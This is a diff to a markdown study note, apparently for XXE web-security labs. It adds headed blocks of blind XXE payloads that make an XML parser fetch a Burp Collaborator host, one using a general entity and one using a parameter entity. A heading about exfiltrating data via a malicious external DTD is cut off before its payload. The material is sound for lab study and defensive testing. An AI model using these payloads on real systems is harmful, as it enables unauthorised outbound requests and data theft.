@@ -28,14 +28,20 @@ Check if stock check features is XML. Check if value inside XML can be modified 
 
 --- 
 ## XXE Vulnerabilities:
+==Blind XXE with out-of-band interaction==
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE food [<!ENTITY xxx SYSTEM "http://burp_collab.oastify.com"> ]>
 <stockCheck><productId>&xxx;</productId><storeId>1</storeId></stockCheck>
+```
 
+==Blind XXE with out-of-band interaction via XML parameter entities==
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE food [<!ENTITY % xxx SYSTEM "http://burp_collab.oastify.com" > %xxx; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
+
+
 ==Exploiting blind XXE to exfiltrate data using a malicious external DTD== 
   FIlename should be exploit.dtd to match what is in the payload on the Exploit server with the following body:
 ```
